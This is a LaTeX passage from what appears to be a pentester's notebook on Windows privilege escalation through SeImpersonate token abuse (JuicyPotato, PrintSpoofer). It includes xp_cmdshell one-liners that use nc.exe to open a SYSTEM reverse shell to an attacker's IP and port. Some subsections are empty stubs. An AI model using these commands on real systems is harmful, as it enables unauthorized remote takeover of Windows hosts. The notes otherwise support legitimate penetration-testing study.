\subsection{Abusing SeImpersonate and SeAssignPrimaryToken}
Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space.

Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

The seImpersonate privilege is usually obtained after gaining remote code
execution via an application that runs in the context of a service account (for
example, uploading a web shell to an ASP.NET web application, achieving remote
code execution through a Jenkins installation, or by executing commands through
MSSQL queries). Whenever an access is gained in this way, privileges should
immediately be checked as its presence often offers a quick and easy route to
elevated privileges. 

Further details on
\href{https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt}{token
impersonation attacks}.

\subsubsection{Juicy Potato}
JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.

Does this still works?

Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that SMB->SMB NTLM relay from one host back to itself will no longer work. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched.


From a MSSQL server with \verb+xp_cmdshell+
\begin{enumerate}
    \item upload \verb+juicyporato.exe+ and \verb+nc.exe+
    \item start a listener on attacker
    \item launch
\begin{verbatim}
xp_cmdshell JuicyPotato.exe -l 53375 -p \c:\windows\system32\cmd.exe -a "/c
c:\tools\nc.exe IP PORT -e cmd.exe" -t *
\end{verbatim}
\end{enumerate}

\subsubsection{PrintSpoofer}

\href{https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/}{PrintSpoofer}
can be used to abuse impersonation privileges on Windows 10 and Server 2019
hosts where JuicyPotato no longer works.

the tool ican spawn a SYSTEM process in the current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell

Case of reverse shell with MSSQL \verb+xp_cmdshell+

\begin{verbatim}
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe  IP PORT -e cmd"
\end{verbatim}

\subsubsection{Rogue potato}

\subsubsection{Other potatos}

